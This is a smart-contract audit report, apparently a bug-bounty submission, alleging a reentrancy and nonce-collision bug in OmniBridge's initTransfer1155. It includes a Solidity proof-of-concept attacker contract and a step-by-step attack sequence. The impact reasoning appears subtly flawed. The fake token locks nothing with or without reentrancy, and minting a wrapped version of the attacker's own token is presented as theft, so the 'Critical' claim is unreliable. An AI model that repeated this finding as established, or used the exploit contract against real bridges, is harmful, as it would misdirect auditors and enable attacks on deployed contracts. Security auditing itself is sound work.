Audit Report

## Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 `safeTransferFrom` Causes Nonce Collision and Unauthorized Token Minting on NEAR — (File: evm/src/omni-bridge/contracts/OmniBridge.sol)

## Summary

`OmniBridge.initTransfer1155` increments `currentOriginNonce` before an external call to an attacker-controlled ERC1155 contract, but re-reads `currentOriginNonce` from storage — without caching it — when calling `initTransferExtension` and emitting `InitTransfer`. Because no reentrancy guard exists, a malicious ERC1155 can re-enter `initTransfer1155` during `safeTransferFrom`, increment the nonce a second time, and cause both the inner and outer frames to emit `InitTransfer` events carrying the same nonce value while locking zero tokens, enabling unauthorized minting on NEAR.

## Finding Description

`OmniBridge.sol` imports no `ReentrancyGuard` and applies no `nonReentrant` modifier to any function. In `initTransfer1155`:

```solidity
currentOriginNonce += 1;                          // L448 — nonce = N, not cached
...
IERC1155(tokenAddress).safeTransferFrom(          // L458 — external call to attacker-controlled contract
    msg.sender, address(this), tokenId, amount, ""
);
...
initTransferExtension(..., currentOriginNonce, ...); // L471 — re-reads storage
emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...); // L483 — re-reads storage
```

The nonce is never stored in a local variable. Both `initTransferExtension` and the `emit` re-read `currentOriginNonce` from storage after the external call. A re-entrant call that increments the nonce again corrupts the value seen by the outer frame.

`tokenAddress` is fully attacker-controlled: `initTransfer1155` performs no whitelist check on it. The malicious ERC1155's `safeTransferFrom` can re-enter `initTransfer1155` directly without invoking `onERC1155Received`, making the `operator != address(this)` guard at L530 entirely irrelevant to this attack path.

`logMetadata1155` is permissionless — any caller can register any `(tokenAddress, tokenId)` pair with no access control, satisfying the NEAR-side prerequisite for the attack.

## Impact Explanation

**Reentrancy execution trace (fee=0, nativeFee=0):**

| Step | `currentOriginNonce` | Action |
|---|---|---|
| Outer call enters | 0 → **1** | `currentOriginNonce += 1` |
| Outer hits `safeTransferFrom` | 1 | Malicious ERC1155 re-enters `initTransfer1155` |
| Inner call enters | 1 → **2** | `currentOriginNonce += 1` |
| Inner hits `safeTransferFrom` | 2 | Malicious ERC1155 returns (no tokens transferred) |
| Inner emits event | 2 | `InitTransfer(nonce=2)` — zero tokens locked |
| Outer `safeTransferFrom` returns | 2 | Malicious ERC1155 returns (no tokens transferred) |
| Outer emits event | 2 | `InitTransfer(nonce=2)` — zero tokens locked |

Outcome: nonce 1 is permanently consumed but never emitted; two `InitTransfer` events with nonce 2 are emitted; zero ERC1155 tokens are held by the bridge. The NEAR side processes the first nonce-2 event and mints the corresponding bridged tokens to the attacker's NEAR address. The second nonce-2 event is rejected as already finalized. The attacker receives one full mint with no collateral locked on EVM.

This is **unauthorized minting / theft of bridged funds**, matching the Critical allowed impact: "unauthorized minting… that changes user or protocol balances."

## Likelihood Explanation

The attack is fully permissionless and requires no privileged role, leaked key, validator collusion, or front-running:

1. Deploy a malicious ERC1155 contract — no admin approval required.
2. Call `logMetadata1155(maliciousERC1155, tokenId)` — no access control.
3. Wait for the NEAR relayer to index the `LogMetadata` event (standard latency, seconds to minutes).
4. Call `initTransfer1155(maliciousERC1155, tokenId, amount, 0, 0, "near:attacker.near", "")`.

The attack is repeatable for any amount and any NEAR recipient address.

## Recommendation

1. **Cache the nonce locally**: Immediately after incrementing, store `currentOriginNonce` in a stack variable and use only that variable for all subsequent references within the function:

```solidity
currentOriginNonce += 1;
uint64 originNonce = currentOriginNonce; // cache before any external call
...
IERC1155(tokenAddress).safeTransferFrom(...);
...
initTransferExtension(..., originNonce, ...);
emit BridgeTypes.InitTransfer(..., originNonce, ...);
```

Apply the same fix to `initTransfer` (L418, L430), which has the same pattern.

2. **Add `ReentrancyGuard`**: Import OpenZeppelin's `ReentrancyGuard` (upgradeable variant) and apply `nonReentrant` to both `initTransfer` and `initTransfer1155` as defense-in-depth.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract MaliciousERC1155 {
    address public bridge;
    bool private _reentered;
    uint256 private _tokenId;
    uint128 private _amount;

    constructor(address bridge_, uint256 tokenId_, uint128 amount_) {
        bridge = bridge_; _tokenId = tokenId_; _amount = amount_;
    }

    // Called by OmniBridge.initTransfer1155 → IERC1155(this).safeTransferFrom(...)
    function safeTransferFrom(address, address, uint256, uint256, bytes calldata) external {
        if (!_reentered) {
            _reentered = true;
            // Re-enter: increments nonce to N+2, emits InitTransfer(nonce=N+2), zero tokens locked
            IOmniBridge(bridge).initTransfer1155(
                address(this), _tokenId, _amount, 0, 0, "near:attacker.near", ""
            );
        }
        // Both inner and outer frames return here without transferring any tokens
    }

    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

// Attack sequence:
// 1. Deploy MaliciousERC1155(bridge, tokenId, amount)
// 2. bridge.logMetadata1155(address(malicious), tokenId)   // permissionless
// 3. Wait for NEAR relayer to index LogMetadata event
// 4. bridge.initTransfer1155(address(malicious), tokenId, amount, 0, 0, "near:attacker.near", "")
//    → emits InitTransfer(nonce=N+1) NEVER (consumed, skipped)
//    → emits InitTransfer(nonce=N+2) TWICE (inner + outer), zero tokens locked
//    → NEAR mints `amount` tokens to attacker.near for free
```